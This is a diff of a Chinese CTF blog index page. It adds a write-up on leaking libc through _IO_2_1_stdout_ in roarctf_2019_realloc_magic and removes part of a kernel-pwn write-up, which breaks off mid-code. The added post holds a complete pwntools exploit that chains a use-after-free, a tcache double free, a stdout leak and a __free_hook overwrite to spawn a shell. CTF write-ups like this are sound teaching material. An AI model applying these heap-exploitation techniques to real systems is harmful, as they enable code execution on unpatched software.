@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -136,7 +136,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">17</span></a>
 
   </li>
         <li class="menu-item menu-item-commonweal">
@@ -195,6 +195,165 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/04/20/IO-leak-sumup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AvavaAYA">
+      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/20/IO-leak-sumup/" class="post-title-link" itemprop="url">IO-leak-sumup</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-20 11:45:14" itemprop="dateCreated datePublished" datetime="2022-04-20T11:45:14+08:00">2022-04-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-22 15:07:11" itemprop="dateModified" datetime="2022-04-22T15:07:11+08:00">2022-04-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <span id="more"></span>
+
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>考虑以下这种情况:  </p>
+<ul>
+<li>可以实现任意地址分配;</li>
+<li>程序没有提供合适的输出功能;</li>
+</ul>
+<p>这时候想要实现利用就需要泄露一个地址，可以通过打<code>_IO_2_1_stdout_</code>来实现信息泄露:  </p>
+<ul>
+<li>低字节覆盖<code>unsorted_bin</code>中残留的<code>main_arena</code>指针，</li>
+</ul>
+<hr>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="roarctf-2019-realloc-magic"><a href="#roarctf-2019-realloc-magic" class="headerlink" title="roarctf_2019_realloc_magic"></a>roarctf_2019_realloc_magic</h3><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/RoarCTF-2019/realloc_magic">attachment</a></p>
+<h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序整体的逻辑比较清晰，<code>glibc</code>版本2.27，主要问题如下:  </p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="built_in">get_int</span>();</span><br><span class="line">chunk_ptr = <span class="built_in">realloc</span>(chunk_ptr, size);</span><br></pre></td></tr></table></figure>
+
+<p>可以通过传入不同的<code>size</code>来控制<code>chunk_ptr</code>:   </p>
+<p><code>chunk_ptr != NULL:</code></p>
+<ul>
+<li><code>size == 0</code>:<ul>
+<li><code>free(chunk_ptr);</code></li>
+<li><strong>返回值为0</strong></li>
+</ul>
+</li>
+<li><code>size != 0</code>:<ul>
+<li><code>size == prev_sz</code>: 返回原先的ptr;</li>
+<li><code>size != prev_sz</code>: 重新分配内存，若分配失败返回值为0，<code>chunk_ptr</code>不会被改变;</li>
+</ul>
+</li>
+</ul>
+<p>因此，通过以上利用就可以实现任意地址分配.</p>
+<hr>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然程序中有<code>UAF</code>，glibc2.27的tcache也基本没什么防护，但想通过现有条件在<code>tcache</code>上打出<code>chunk_overlap</code>实现任意地址分配还是需要一些构造的:  </p>
+<p>首先，这个程序只使用一个位于<code>.bss</code>段上的指针来寻址堆块，构造堆块重叠的思路一般是:  </p>
+<ul>
+<li>先分配一个<code>chunk0</code></li>
+<li><code>realloc(0)</code>清空指针，再分配一个<code>chunk1</code>( 大于<code>chunk0</code>免得重新把<code>chunk0</code>拿出来 )</li>
+<li>多次<code>free(chunk1)</code>造成<code>double free</code>，在<code>realloc(0)</code>清空指针</li>
+<li>把<code>chunk0</code>重新分配出来，接着<code>realloc()</code>扩充<code>chunk0</code></li>
+<li>接下来再往<code>chunk0</code>上写入数据就能改到<code>chunk1</code>的<code>fd</code>指针了，同时<code>chunk1</code>现在是在<code>tcache_bins</code>中的</li>
+</ul>
+<p>如此就实现了任意地址写.</p>
+<p>但是这里我们没有<code>libc_base</code>地址，不过考虑到:  </p>
+<ul>
+<li><p><code>unsorted_bins</code>中第一个堆块的<code>fd</code>和<code>bk</code>指针会指向<code>main_arena+96</code>的地址</p>
+</li>
+<li><p><code>libc_base</code>的后12个比特位总是0，覆盖<code>fd</code>时可以直接去覆盖<code>main_arena+96</code>的后12位，再加以爆破4位就可以分配到<code>_IO_2_1_stdout</code>上进行进一步利用:  </p>
+<ul>
+<li>例如覆盖<code>fd</code>低16位为:  <code>p16( (0x6 &lt;&lt; 0xc) + (l.symbols[&#39;_IO_2_1_stdout_&#39;] &amp; 0xfff) )</code>就有 $\frac{1}{16}$ 的概率成功，实际利用中写个循环即可.</li>
+</ul>
+</li>
+</ul>
+<p>此外，本题中若是直接通过<code>tcache_double_free</code>填满<code>tcache</code>，则该堆块在下次释放时会因为和<code>top_chunk</code>相邻而直接触发<code>top_chunk</code>的合并，无法分配进<code>unsorted_bins</code>，因此就需要借助堆块的收缩来隔开<code>freed_chunk</code>和<code>top_chunk</code>:  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">freeN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reallocN</span>(<span class="params">size, content</span>):</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clearN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backD</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line">reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">clearN()</span><br><span class="line">reallocN(<span class="number">0x100</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;bbb&#x27;</span>)		<span class="comment"># 隔开topchunk和unsorted_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	freeN()</span><br><span class="line">clearN()</span><br><span class="line"></span><br><span class="line">reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">reallocN(<span class="number">0xc0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p16( (<span class="number">0x6</span> &lt;&lt; <span class="number">0xc</span>) + (l.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; <span class="number">0xfff</span>) ))</span><br><span class="line"><span class="comment"># 上一行中p64(0x51)是为了防止清空指针时把这一块又放回0xb0大小的tcache中，导致下一个chunk( _IO_2_1_stdout )无法取出</span></span><br><span class="line"></span><br><span class="line">clearN()</span><br><span class="line">reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">clearN()</span><br><span class="line"><span class="comment"># reallocN(0xa0, &#x27;&#x27;&#x27;payload&#x27;&#x27;&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>如此一来，就能够改到<code>_IO_2_1_stdout</code>结构体的所有内容，但<code>payload</code>如何设置才能使程序泄露地址呢:  </p>
+<ul>
+<li>设置<code>flag = 0xfbad1887</code></li>
+<li>设置<code>_IO_read_ptr=0</code>, <code>_IO_read_end=0</code>, <code>_IO_read_base=0</code>, <code>_IO_write_base</code>的最后两位为<code>0x58</code><ul>
+<li>即: <code>payload = p64(0)*3 + p8(0x58)</code></li>
+</ul>
+</li>
+</ul>
+<p>之后当程序调用<code>puts</code>函数时，就会额外打印<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的所有内容，往往第一个输出的值是<code>_IO_file_jumps</code>的地址.</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p8(<span class="number">0x58</span>)</span><br><span class="line">reallocN(<span class="number">0xa0</span>, payload)</span><br><span class="line">leak = uu64(rn(<span class="number">6</span>))</span><br><span class="line"><span class="keyword">if</span> leak &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span>:</span><br><span class="line">	<span class="keyword">raise</span> Exception(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">libc_addr = leak - <span class="number">0x3e82a0</span></span><br><span class="line">one_gadget= libc_addr + <span class="number">0x4f3c2</span></span><br><span class="line">lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>此时<code>chunk_ptr</code>指在<code>_IO_2_1_stdout</code>结构体上，考虑调用题目提供的辅助函数清空<code>chunk_ptr</code>，然后直接打<code>free_hook</code>即可.</p>
+<hr>
+<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote_service = &quot;&quot;</span></span><br><span class="line"><span class="comment"># remote_service = remote_service.strip().split(&quot; &quot;)</span></span><br><span class="line"><span class="comment"># p = remote(remote_service[0], int(remote_service[1]))</span></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">e = ELF(filename, checksec=<span class="literal">False</span>)</span><br><span class="line">l = ELF(e.libc.path, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span> : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span> : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span> : gdb.attach(p, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debugPID</span>():</span><br><span class="line">    lg(<span class="string">&quot;p.pid&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">freeN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reallocN</span>(<span class="params">size, content</span>):</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clearN</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;Size?\n&quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">	ru(<span class="string">b&quot;t?\n&quot;</span>)</span><br><span class="line">	sn(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ba</span>():</span><br><span class="line">	ru(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">	sl(<span class="string">b&quot;666&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	p = process(filename)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x100</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">			freeN()</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x20</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		reallocN(<span class="number">0xc0</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>) + p16((<span class="number">0x6</span> &lt;&lt; <span class="number">0xc</span>) + (l.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] &amp; <span class="number">0xfff</span>)))</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		payload = p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+ p8(<span class="number">0x58</span>)</span><br><span class="line">		reallocN(<span class="number">0xa0</span>, payload)</span><br><span class="line">		leak = uu64(rn(<span class="number">6</span>))</span><br><span class="line">		<span class="keyword">if</span> leak &gt;&gt; <span class="number">40</span> != <span class="number">0x7f</span>:</span><br><span class="line">			<span class="keyword">raise</span> Exception(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">		lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">		libc_addr = leak - <span class="number">0x3e82a0</span></span><br><span class="line">		one_gadget= libc_addr + <span class="number">0x4f3c2</span></span><br><span class="line">		lg(<span class="string">&quot;libc_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">		ba()</span><br><span class="line">		payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + p64(libc_addr + l.symbols[<span class="string">&#x27;__free_hook&#x27;</span>])</span><br><span class="line">		reallocN(<span class="number">0xd0</span>, payload)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x40</span>, <span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">		clearN()</span><br><span class="line">		reallocN(<span class="number">0x40</span>, p64(one_gadget))</span><br><span class="line">		freeN()</span><br><span class="line"></span><br><span class="line">		debugPID()</span><br><span class="line">		irt()</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(e)</span><br><span class="line">		<span class="comment"># debugPID()</span></span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -675,117 +834,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://avavaaya.github.io/2022/03/15/UTCTF-2022-bloat-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="AvavaAYA">
-      <meta itemprop="description" content="在看吗, 在看的话就给你一拳">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/15/UTCTF-2022-bloat-writeup/" class="post-title-link" itemprop="url">UTCTF-2022-bloat-writeup</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-03-15 21:08:50 / 修改时间：21:09:31" itemprop="dateCreated datePublished" datetime="2022-03-15T21:08:50+08:00">2022-03-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn-writeup/" itemprop="url" rel="index"><span itemprop="name">pwn-writeup</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <span id="more"></span>
-
-<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>按照惯例，先解压:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> rootfs</span><br><span class="line"><span class="built_in">cd</span> rootfs</span><br><span class="line"><span class="built_in">mv</span> ../rootfs.cpio.gz .</span><br><span class="line">gunzip ./rootfs.cpio.gz</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure>
-
-<p>kernel-pwn题目的突破口往往出现在出题者拓展的kernel-object中:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[rootfs]$ find ./ -name *.ko</span><br><span class="line">./lib/modules/5.15.0/extra/bloat.ko</span><br></pre></td></tr></table></figure>
-
-<p>为了方便后面的调试，先把bzImage解压成elf，并解析出部分符号表:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf bzImage vmlinux.bin</span><br></pre></td></tr></table></figure>
-<p>在run.sh末尾加上-s与-S选项，进入gdb:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux.bin</span><br><span class="line">(gdb)&gt; target remote localhost:1234</span><br></pre></td></tr></table></figure>
-<p>当然，也可以直接</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb -ex <span class="string">&#x27;set architecture i386:x86_64&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;target remote localhost:1234&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;add-symbol-file bloat.ko 0xffffffffc0000000&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;b load_bloat_binary&#x27;</span> \</span><br><span class="line">-ex <span class="string">&#x27;c&#x27;</span> ./vmlinux.bin</span><br></pre></td></tr></table></figure>
-<p>一步到位，把断点下在load_bloat_binary函数上.</p>
-<hr>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>将bloat.ko拿进ida中分析:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="built_in">strrchr</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">0x60</span>), <span class="string">&#x27;.&#x27;</span>);<span class="comment">// 文件后缀名判断</span></span><br><span class="line"><span class="keyword">if</span> ( !v1 )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v1, <span class="string">&quot;.bloat&quot;</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFF8</span>;</span><br><span class="line">v2 = <span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">2LL</span>);<span class="comment">// 判断文件大小</span></span><br><span class="line"><span class="built_in">generic_file_llseek</span>(*(_QWORD *)(a1 + <span class="number">0x40</span>), <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
-<p>且根据a1是setup_new_exec等函数的参数，在:<br><a target="_blank" rel="noopener external nofollow noreferrer" href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/binfmts.h#L17">elixir.bootlin.com</a>中进行检索，确定a1的结构体:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_binprm</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> __int64 